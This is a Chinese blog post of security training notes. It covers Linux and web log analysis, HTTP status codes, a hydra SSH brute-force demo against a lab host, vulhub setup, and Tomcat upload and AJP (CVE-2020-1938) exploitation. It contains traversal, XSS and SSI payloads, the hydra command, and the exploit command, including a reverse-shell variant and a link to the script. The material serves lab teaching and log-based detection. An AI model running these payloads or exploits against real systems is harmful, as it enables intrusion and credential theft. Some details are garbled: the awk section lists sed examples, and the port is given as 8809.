---
title: 【网络安全1x06】安恒厂家网络安全培训 --- day6
date: 2020-07-06 20:55:08
tags: [网络安全, kali, vulhub]
---

上午讲linux日志分析，包括web攻击痕迹，web状态码，linux系统常用命令及日志文件分析。做了一个暴力破解ssh的示例，并查看靶机日志。

下午配置docker，讲了两个vulhub的实例，一个tomcat文件上传漏洞，一个tomcat ajp 文件读取漏洞。

<!-- more -->

# linux日志分析

## web攻击常见痕迹

### "." ".."和"…"请求

这些攻击痕迹是非常普遍的用于 web 应用程序和 web 服务器，它用于允许攻击者或者蠕虫病毒程序改变 web 服务器的路径，访问非公开的区域。大多数的 CGI 程序漏洞含有这些".."请求。

```
例如：http://localhost/vuln/fi/?page=../../../etc/passwd
```

这个列子展示了攻击者请求passwd这个文件，如果攻击者有能力突破 web 服务器根目录，那么可以获得更多的信息，并进一步的获得特权。 

### "%20"请求

%20 是表示空格的16进制数值，这个请求有时可以帮助执行一些命令。

```
例如：http://localhost/vuln/fi/?page=ls%20-a
```

这个列子展示了攻击者执行了一个 unix 的命令，列出请求的整个 目录的文件，导致攻击者访问你系统中重要的文件，帮助他进一步取得 特权提供条件。 

### "%00"请求

%00 表示 16 进制的空字节，他能够用于绕过后缀检测，并请求不同类型的文件。

```
例如：http://localhost/vuln/fi/?page=index.html
```

假如这是一个有效的请求，那么攻击者就会开始尝试请求改变 web 服务器的路径。如：

```
http://localhost/vuln/fi/?page=../../../etc/passwd
```

而服务器对请求文件的后缀做了限制，程序只请求.html的文件。那么攻击者可以利用%00字符来截断文件后缀，从而绕过程序检测。

```
http://localhost/vuln/fi/?page=../../../etc/passwd%00html
```

### "|"请求

这是个管道字符，在 unix 系统用于帮助在一个请求中同时执行多个系统命令。

```
例如：#cat access_log│ grep -i ".."
```

（这个命令将显示日志中的".."请求，常用于发现攻击者和蠕虫攻击）

```
http://localhost/vuln/fi/?page=cat%20access_log│ grep%20-i%20".." 
```

这个请求 cat 命令的执行并且 grep 命令也将执行，查询出”.."

### ";" 请求 

在 unix 系统，这个字符允许多个命令在一行执行 

```
Example: 
# id;uname -a 
（执行 id 命令后，紧跟着执行 uname 命令） 
```

### "<" 和 ">" 请求 

应该检查你的日志记录中这两个字符，众多的原因中，首要的一个是这个字符表明了添加数据在文件中 

```
例如： 
# echo "test" >> /test （请求写信息在test 这个文件中) 
```

也可以利用这两个字符来篡改页面，例如：

```
http://localhost/vuln/fi/?name=<script>alert(1)</script>
```

### "!"请求

这种字符请求常用于对 SSI(Server Side Include) 进行攻击，可以用于欺骗用户点击被攻击者设定的连接。

```
例如：http://localhost/vuln/fi/?name=<!%20--#include%20file=" http://hacker/hack.html" -->
```

## 状态码详解

基本上可以分为五类：

### 1xx 为消息类，该类状态代码用于表示服务器临时回应

* 100 Continue 表示初始的请求已经被服务器接受，浏览器应当继续发送请求的其余部分
* 101 Switching Protocols 服务器将遵从客户的请求转换到另外一种协议。

### 2xx 表示浏览器端请求被处理成功

* **200 OK 一切正常。**
* 201 Created 服务器已经创建了文档，Location 头给出了它的 URL。
* 202 Accepted 已经接受请求，但处理尚未完成。
* 203 Non-Authoritative Information 文档已经正常地返回，但一些应答头可能不正确，因为使用的是文档的拷贝。
* 204 No Content 没有新文档，浏览器应该继续显示原来的文档。这个跟下面的 304 非常相似。
* 205 Reset Content 没有新的内容，但浏览器应该重置它所显示的内容。用来强制浏览器清除表单输入内容。
* 206 Partial Content 客户发送了一个带有 Range 头的GET请求，服务器完成了它。注意，通过 Range 可以实现断点续传。

### 3xx 重定向

* 300 Multiple Choices 客户请求的文档可以在多个位置找到，这些位置已经在返回的文档内列出。如果服务器要提出优先选择，则应该在Location应答头指明。
* 301 Moved Permanently 客户请求的文档在其他地方，新的URL在Location头中给出，浏览器应该自动地访问新的URL。
* **302 Found 类似于301，但新的URL应该被视为临时性的替代，而不是永久性的。注意，在HTTP1.0中对应的状态信息是“Moved Temporatily”。 **
```
出现该状态代码时，浏览器能够自动访问新的URL，因此它是一个很有用的状态代码。 
注意这个状态代码有时候可以和301替换使用。例如，如果浏览器错误地请求http://host/~user ，有的服务器返回301，有的则返回302。 
严格地说，我们只能假定只有当原来的请求是GET时浏览器才会自动重定向。请参见307。
```
* 303 See Other 类似于301/302，不同之处在于，如果原来的请求是POST，Location头指定的重定向目标文档应该通过GET提取。
* 304 Not Modified 客户端有缓冲的文档并发出了一个条件性的请求(一般是提供If-Modified-Since头表示客户只想比指定日期更新的文档)。服务器告诉客户，原来缓冲的文档还可以继续使用。
* 305 Use Proxy 客户请求的文档应该通过Location头所指明的代理服务器提取。
* 307 Temporary Redirect 和302(Found)相同。许多浏览器会错误地响应302应答进行重定向，即使原来的请求是POST，即使它实际上只能在POST请求的应答是303时 才能重定向。由于这个原因，HTTP 1.1新增了307，以便更加清除地区分几个状态代码：当出现303应答时，浏览器可以跟随重定向的GET和POST请求；如果是307应答，则浏览器只 能跟随对GET请求的重定向。

### 4xx 客户端错误

* 400 Bad Request 请求出现语法错误。
* 401 Unauthorized 客户试图未经授权访问受密码保护的页面。应答中会包含一个WWW-Authenticate头，浏览器据此显示用户名字/密码对话框，然后在填写合适的Authorization头后再次发出请求。
* **403 Forbidden 资源不可用。服务器理解客户的请求，但拒绝处理它。通常由于服务器上文件或目录的权限设置导致。**
* **404 Not Found 无法找到指定位置的资源。这也是一个常用的应答。**
* 405 Method Not Allowed 请求方法(GET、POST、HEAD、Delete、PUT、TRACE等)对指定的资源不适用。
* 406 Not Acceptable 指定的资源已经找到，但它的MIME类型和客户在Accpet头中所指定的不兼容。
* 407 Proxy Authentication Required 类似于401，表示客户必须先经过代理服务器的授权。
* 408 Request Timeout 在服务器许可的等待时间内，客户一直没有发出任何请求。客户可以在以后重复同一请求。
* 409 Conflict 通常和PUT请求有关。由于请求和资源的当前状态相冲突，因此请求不能成功。
* 410 Gone 所请求的文档已经不再可用，而且服务器不知道应该重定向到哪一个地址。它和404的不同在于，返回407表示文档永久地离开了指定的位置，而404表示由于未知的原因文档不可用。
* 411 Length Required 服务器不能处理请求，除非客户发送一个Content-Length头。
* 412 Precondition Failed 请求头中指定的一些前提条件失败。
* 413 Request Entity Too Large 目标文档的大小超过服务器当前愿意处理的大小。如果服务器认为自己能够稍后再处理该请求，则应该提供一个Retry-After头。
* 414 Request URI Too Long URI太长。
* 416 Requested Range Not Satisfiable 服务器不能满足客户在请求中指定的Range头。

### 5xx 服务器错误

* **500 Internal Server Error 服务器遇到了意料不到的情况，不能完成客户的请求。 (服务端的程序错误)**
* 501 Not Implemented 服务器不支持实现请求所需要的功能。例如，客户发出了一个服务器不支持的PUT请求。
* **502 Bad Gateway 服务器作为网关或者代理时，为了完成请求访问下一个服务器，但该服务器返回了非法的应答。**
* 503 Service Unavailable 服务器由于维护或者负载过重未能应答。例如，Servlet可能在数据库连接池已满的情况下返回503。服务器返回503时可以提供一个Retry-After头。
* 504 Gateway Timeout 由作为代理或网关的服务器使用，表示不能及时地从远程服务器获得应答。
* 505 HTTP Version Not Supported 服务器不支持请求中所指明的HTTP版本。

## apache日志分析

### access.log

1. 记录访问服务器的远程主机地址，从而得知访问者来自何处；
2. 记录访问者请求的资源；
3. 记录访问者使用的浏览器；
4. 记录访问者的访问时间；

查看日志，一般短时间几秒内同一IP大量GET、POST请求，则有可能该IP在攻击web服务。

## linux系统日志分析

### /var/log/各个日志文件分析

1. **/var/log/messages — 包括整体系统信息，其中也包含系统启动期间的日志。此外，mail，cron，daemon，kern和auth等内容也记录在/var/log/messages日志中。该日志文件是许多进程日志文件的汇总，从该文件可以看出任何入侵企图或成功的入侵。**

2. /var/log/dmesg — 包含内核缓冲信息（kernel ring buffer）。在系统启动时，会在屏幕上显示许多与硬件有关的信息。可以用dmesg查看它们。

3. /var/log/auth.log — 包含系统授权信息，包括用户登录和使用的权限机制等。

4. /var/log/boot.log — 包含系统启动时的日志。

5. /var/log/daemon.log — 包含各种系统后台守护进程日志信息。

6. /var/log/dpkg.log – 包括安装或dpkg命令清除软件包的日志。

7. /var/log/kern.log – 包含内核产生的日志，有助于在定制内核时解决问题。

8. /var/log/lastlog — 记录所有用户的最近信息。该日志文件记录最近成功登录的事件和最后一次不成功的登录事件，由login生成。在每次用户登录时被查询，该文件是二进制文件，需要使用lastlog命令查看，根据UID排序显示登录名、端口号和上次登录时间。如果某用户从来没有登录过，就显示为"``Never logged in``"。系统账户诸如bin、daemon、adm、uucp、mail等决不应该登录，如果发现这些账户已经登录，就说明系统可能已经被入侵了。若发现记录的时间不是用户上次登录的时间，则说明该用户的账户已经泄密了。

9. /var/log/maillog /var/log/mail.log — 包含来着系统运行电子邮件服务器的日志信息。它可以用来查看用户使用哪个系统发送工具或把数据发送到哪个系统。例如，sendmail日志信息就全部送到这个文件中。

10. /var/log/user.log — 记录所有等级用户信息的日志。

11. /var/log/Xorg.x.log — 来自X的日志信息。

12. /var/log/alternatives.log – 更新替代信息都记录在这个文件中。

13. **/var/log/btmp – 记录所有失败登录信息。使用last命令可以查看btmp文件。例如，``last -f /var/log/btmp | more``。**

14. /var/log/cups — 涉及所有打印信息的日志。

15. /var/log/anaconda.log — 在安装Linux时，所有安装信息都储存在这个文件中。

16. /var/log/yum.log — 包含使用yum安装的软件包信息。

17. **/var/log/cron — 每当cron进程开始一个工作时，就会将相关信息记录在这个文件中。**

18. **/var/log/secure — 包含验证和授权方面信息。例如，sshd会将所有信息记录（其中包括失败登录）在这里。**

19. /var/log/wtmp或/var/log/utmp — 包含登录信息。使用wtmp可以找出谁正在登陆进入系统，谁使用命令显示这个文件或信息等。utmp可以查看当前在线用户。

```
	wtmp日志文件永久记录每个用户登录、注销及系统的启动、停机的事件。因此随着系统正常运行时间的增加，该文件的大小也会越来越大，增加的速度取决于系统用户登录的次数。该日志文件可以用来查看用户的登录记录，last命令就通过访问这个文件获得这些信息，并以反序从后向前显示用户的登录。
	utmp日志文件记录有关当前登录的每个用户的信息。因此这个文件会随着用户登录和注销系统而不断变化，它只保留当时联机的用户记录，不会 为用户保留永久的记录。系统中需要查询当前用户状态的程序，如 who、w、users、finger等就需要访问这个文件。该日志文件并不能包括所有精确的信息，因为某些突发错误会终止用户登录会话，而系统没有及时 更新 utmp记录，因此该日志文件的记录不是百分之百值得信赖的。
```

20. /var/log/faillog – 包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。

21. 除了上述Log文件以外，/var/log还基于系统的具体应用包含以下一些子目录：

* /var/log/httpd/或/var/log/apache2 — 包含服务器access_log和error_log信息。
* /var/log/lighttpd/ — 包含light HTTPD的access_log和error_log。
* /var/log/mail/ –  这个子目录包含邮件服务器的额外日志。
* /var/log/prelink/ — 包含.so文件被prelink修改的信息。
* /var/log/audit/ — 包含被 Linux audit daemon储存的信息。
* /var/log/samba/ – 包含由samba存储的信息。
* /var/log/sa/ — 包含每日由sysstat软件包收集的sar文件。
* /var/log/sssd/ – 用于守护进程安全服务。

### 查看系统的日志实用命令

1. last命令

last命令用于显示用户最近登录信息。单独执行last命令，它会读取``/var/log/wtmp``的文件，并把该给文件的内容记录的登入系统的用户名单全部显示出来。wtmp,btmp,utmp均为二进制文件，不能用cat查看，可用last打开。

``` bash
#语法：last (选项)（参数）
-a 把从何处登入系统的主机名称或ip地址，显示在最后一行。
-d 指定记录文件。指定记录文件。将IP地址转换成主机名称。
-f <记录文件> 　指定记录文件。
-n <显示列数>或-<显示列数> 　设置列出名单的显示列数。
-R 不显示登入系统的主机名称或IP地址。
-x 显示系统关机，重新开机，以及执行等级的改变等信息

#示例：
last				#常用用法，不加参数
last -n 5 -a -i 			#最后一列显示IP地址
last -n 8 -f  /var/log/btmp        #该文件更详细，可显示ssh远程登录
last -n 10 admin                  #显示前10个admin登录的记录
last -R 10                         #不显示主机名
last –F                            #显示完整登录登出信息
```

2. history命令

history命令用于显示指定数目的指令命令，读取历史命令文件中的目录到历史命令缓冲区和将历史命令缓冲区中的目录写入命令文件。该命令单独使用时，仅显示历史命令，在命令行中，可以使用符号!执行指定序号的历史命令。例如，要执行第2个历史命令，则输入!2。历史命令是被保存在内存中的，当退出或者登录shell时，会自动保存或读取。在内存中，历史命令仅能够存储1000条历史命令，该数量是由环境变量HISTSIZE进行控制。

``` bash
#语法：history(选项)(参数)
-c：清空当前历史命令；
-a：将历史命令缓冲区中命令写入历史命令文件中；
-r：将历史命令文件中的命令读入当前历史命令缓冲区；
-w：将当前历史命令缓冲区命令写入历史命令文件中。

#示例：
history 10                       #只列出最近10条历史记录
history | more –a		#逐屏列出所有的历史记录
history –c                       #清空history当前所有历史命令的记录
```

3. cat命令

cat命令连接文件并打印到标准输出设备上，cat经常用来显示文件的内容。

``` bash
#语法：cat(选项)(参数)
-n或-number：有1开始对所有输出的行数编号；
-b或--number-nonblank：和-n相似，只不过对于空白行不编号；
-s或--squeeze-blank：当遇到有连续两行以上的空白行，就代换为一行的空白行；
-A：显示不可打印字符，行尾显示“$”；
-e：等价于"-vE"选项；
-t：等价于"-vT"选项；

#示例：
cat 1.txt
```

4. head命令

head命令用于显示文件的开头的内容。在默认情况下，head命令显示文件的头10行内容。

``` bash
#语法：head(选项)(参数)
-n<数字>：指定显示头部内容的行数；

#示例：
head -n 5 log.txt                #显示文件的前n行
head -n -5 log.txt               #输出文件除了最后n行的全部内容
head -c 30 log.txt               #显示文件前n个字节
head log.txt  log1.txt           #一次显示多个文件
```

5. tail命令

tail命令用于输入文件中的尾部内容。tail命令默认在屏幕上显示指定文件的末尾10行。如果给定的文件不止一个，则在显示的每个文件前面加一个文件名标题。如果没有指定文件或者文件名为“-”，则读取标准输入。

```  bash
语法：tail(选项)(参数)
--retry：即是在tail命令启动时，文件不可访问或者文件稍后变得不可访问，都始终尝试打开文件。使用此选项时需要与选项“——follow=name”连用；
-c<N>或——bytes=<N>：输出文件尾部的N（N为整数）个字节内容；
-f<name/descriptor>或；--follow<nameldescript>：显示文件最新追加的内容。“name”表示以文件名的方式监视文件的变化。“-f”与“-fdescriptor”等效；
-F：与选项“-follow=name”和“--retry"连用时功能相同；
-n<N>或——line=<N>：输出文件的尾部N（N位数字）行内容。
--pid=<进程号>：与“-f”选项连用，当指定的进程号的进程终止后，自动退出tail命令；
-q或——quiet或——silent：当有多个文件参数时，不输出各个文件名；
-s<秒数>或——sleep-interal=<秒数>：与“-f”选项连用，指定监视文件变化时间隔的秒数；
-v或——verbose：当有多个文件参数时，总是输出各个文件名；
--help：显示指令的帮助信息；
--version：显示指令的版本信息。

#示例：
tail -f /var/log/messages       #实时查看日志
tail -n 1000                    #显示最后1000行           
tail -n +1000                   #从1000行开始显示，显示1000行以后的
```

6. grep命令

全面搜索正则表达式并把行打印出来）是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。

grep的工作方式是这样的，它在一个或多个文件中搜索字符串模板。如果模板包括空格，则必须被引用，模板后的所有字符串被看作文件名。搜索的结果被送到标准输出，不影响原文件内容。

grep可用于shell脚本，因为grep通过返回一个状态值来说明搜索的状态，如果模板搜索成功，则返回0，如果搜索不成功，则返回1，如果搜索的文件不存在，则返回2。我们利用这些返回值就可进行一些自动化的文本处理工作。

``` bash
#参数：
-a 不要忽略二进制数据。
-A<显示列数> 除了显示符合范本样式的那一行之外，并显示该行之后的内容。
-b 在显示符合范本样式的那一行之外，并显示该行之前的内容。
-c 计算符合范本样式的列数。
-C<显示列数>或-<显示列数>  除了显示符合范本样式的那一列之外，并显示该列之前后的内容。
-d<进行动作> 当指定要查找的是目录而非文件时，必须使用这项参数，否则grep命令将回报信息并停止动作。
-e<范本样式> 指定字符串作为查找文件内容的范本样式。
-E 将范本样式为延伸的普通表示法来使用，意味着使用能使用扩展正则表达式。
-f<范本文件> 指定范本文件，其内容有一个或多个范本样式，让grep查找符合范本条件的文件内容，格式为每一列的范本样式。
-F 将范本样式视为固定字符串的列表。
-G 将范本样式视为普通的表示法来使用。
-h 在显示符合范本样式的那一列之前，不标示该列所属的文件名称。
-H 在显示符合范本样式的那一列之前，标示该列的文件名称。
-i 忽略字符大小写的差别。
-l 列出文件内容符合指定的范本样式的文件名称。
-L 列出文件内容不符合指定的范本样式的文件名称。
-n 在显示符合范本样式的那一列之前，标示出该列的编号。
-q 不显示任何信息。
-R/-r 此参数的效果和指定“-d recurse”参数相同。
-s 不显示错误信息。
-v 反转查找。
-w 只显示全字符合的列。
-x 只显示全列符合的列。
-y 此参数效果跟“-i”相同。
-o 只输出文件中匹配到的部分。

#grep的规则表达式:
^       #锚定行的开始 如：'^grep'匹配所有以grep开头的行。    
$        #锚定行的结束 如：'grep$'匹配所有以grep结尾的行。    
.        #匹配一个非换行符的字符 如：'gr.p'匹配gr后接一个任意字符，然后是p。    
*        #匹配零个或多个先前字符 如：'*grep'匹配所有一个或多个空格后紧跟grep的行。    
.*        #一起用代表任意字符。   
[]        #匹配一个指定范围内的字符，如'[Gg]rep'匹配Grep和grep。    
[^]      #匹配一个不在指定范围内的字符，如：'[^A-FH-Z]rep'匹配不包含A-R和T-Z的一个字母开头，紧跟rep的行。    
\(..\)     #标记匹配字符，如'\(love\)'，love被标记为1。    
\<        #锚定单词的开始，如:'\<grep'匹配包含以grep开头的单词的行。    
\>        #锚定单词的结束，如'grep\>'匹配包含以grep结尾的单词的行。    
x\{m\}   #重复字符x，m次，如：'0\{5\}'匹配包含5个o的行。    
x\{m,\}   #重复字符x,至少m次，如：'o\{5,\}'匹配至少有5个o的行。    
x\{m,n\}  #重复字符x，至少m次，不多于n次，如：'o\{5,10\}'匹配5--10个o的行。   
\w       #匹配文字和数字字符，也就是[A-Za-z0-9]，如：'G\w*p'匹配以G后跟零个或多个文字或数字字符，然后是p。   
\W       #\w的反置形式，匹配一个或多个非单词字符，如点号句号等。   
\b        #单词锁定符，如: '\bgrep\b'只匹配grep。

#示例：
ps -ef|grep svn					#查找指定进程
grep 'INFO' demo.log				#在文件中查找所有包含INFO的行
cat test.txt | grep -f test2.txt      #从文件中读取关键词进行搜索
grep  -n 'linux' test.txt             #从文件中查找关键词,显示行号
cat test.txt |grep hat$             #输出以hat结尾的行内容
ifconfig eth0|grep -E "([0-9]{1,3}\.){3}[0-9]"     #输出ip地址
grep '.' access1.log|grep -Ev '404' > access2.log   #没有404的日志信息
grep 'Mar 10' /var/log/messages     #单独看某一天的日志
```

7. **awk命令**

awk是一种编程语言，用于在linux/unix下对文本和数据进行处理。数据可以来自标准输入(stdin)、一个或多个文件，或其它命令的输出。它支持用户自定义函数和动态正则表达式等先进功能，是linux/unix下的一个强大编程工具。它在命令行中使用，但更多是作为脚本来使用。awk有很多内建的功能，比如数组、函数等，这是它和C语言的相同之处，灵活性是awk最大的优势。

``` bash
#语法：awk [-F|-f|-v] ‘BEGIN{} //{command1; command2} END{}’ 
[-F|-f|-v]   大参数，-F指定分隔符，-f调用脚本，-v定义变量 var=value
'  '          引用代码块
BEGIN   初始化代码块，在对每一行进行处理之前，初始化代码，主要是引用全局变量，设置FS分隔符
//           匹配代码块，可以是字符串或正则表达式
{}           命令代码块，包含一条或多条命令
；          多条命令使用分号分隔
END      结尾代码块，在对每一行进行处理之后再执行的代码块，主要是进行最终计算或输出结尾摘要信息

#要点：
$0           表示整个当前行
$1           每行第一个字段
NF          字段数量变量
NR          每行的记录号，多文件记录递增
FNR        与NR类似，不过多文件记录不递增，每个文件都从1开始
\t            制表符
\n           换行符
FS          BEGIN时定义分隔符
RS       输入的记录分隔符， 默认为换行符(即文本是按一行一行输入)
~            匹配，与==相比不是精确比较
!~           不匹配，不精确比较
==         等于，必须全部相等，精确比较
!=           不等于，精确比较
&&　     逻辑与

||             逻辑或
+            匹配时表示1个或1个以上
/[0-9][0-9]+/   两个或两个以上数字
/[0-9][0-9]*/    一个或一个以上数字
FILENAME 文件名
OFS      输出字段分隔符， 默认也是空格，可以改为制表符等
ORS        输出的记录分隔符，默认为换行符,即处理结果也是一行一行输出到屏幕
-F'[:#/]'   定义三个分隔符

#示例：
sed 's/book/books/' file				#替换文本中的字符串
sed –n 's/test/TEST/p' file           #只打印那些发生替换的行
sed 's/book/books/g' file            #后缀 /g 标记会替换每一行中的所有匹配
sed 's/\/bin/\/usr\/local\/bin/g'      #定界符/出现在样式内部需要进行转义
sed '/^test/'d file                    #删除文件中所有开头是test的行
```

## 日志分析场景实例

### hydra对ssh暴力破解

``` bash
#新建用户名字典、密码字典
# -L 用户字典 -P 密码字典 -t 线程数(默认16) -vV 详细信息 -e [nsr] null密码、login做密码、优先用户字典做循环
hydra -L users.txt -P password.txt -t 16 -vV -e ns 192.168.137.129 ssh
```

### 日志分析

1. 查看用户最近登录记录

``` bash
last
```

2. 查看最近失败登陆记录

```  bash
cat /var/log/auth.log | grep Failed 
```

3. 对登陆失败记录进行筛选，选择固定时间段内，固定IP的登陆失败记录和成功记录，可以发现该攻击者成功爆破出用户root、roadlyl的密码。

``` bash
cat /var/log/auth.log | grep -E "(Jul  6|Jul 06).*Failed.*192.168.137.128" 
```

# vulhub配置

## 安装docker

```
sudo yum install docker -y
```

## 安装docker-compose

```
pip install docker-compose
```

## 配置docker加速

```
curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io
```

## 下载vulhub漏洞目录

```
git clone https://github.com/vulhub/vulhub.git
```

## 如何使用

进入相应漏洞文件夹编译启用即可

``` bash
#开启示例
cd ~/vulhub/struts2/s2-013/

docker-compose build
docker-compose up -d

#关闭
docker-compose down

#进入docker tomcat命令行
docker-compose exec tomcat bash
```

# tomcat 文件上传漏洞

## 简易步骤

1. 编写jsp脚本

2. 压缩到`.war`格式压缩包中

3. 上传到服务器，自动解压至同名目录下

4. 访问jsp脚本

## 防护手段

修改口令？

# CNVD-2020-10487(CVE-2020-1938)tomcat ajp 文件读取漏洞

## 漏洞简介

   Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。

## 影响范围

* Apache Tomcat 6
* Apache Tomcat 7 < 7.0.100
* Apache Tomcat 8 < 8.5.51
* Apache Tomcat 9 < 9.0.31

## 漏洞复现

``` bash
python CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f "/WEB-INF/web.xml" 192.168.137.129
```

对脚本加以修改，这里下到一个增加了`--rce`来反弹shell的py3脚本：

鏈接: https://pan.baidu.com/s/101wFmK1J0OGYRC383fdBBA 提取碼: xg4s

执行命令，msf获得反弹shell：

``` bash
python3 2020-10487.py -p 8009 -f /WEB-INF/shell.jsp 192.168.137.129 --rce 1
```

## 漏洞防护

1. 升级tomcat版本

2. 关闭8809端口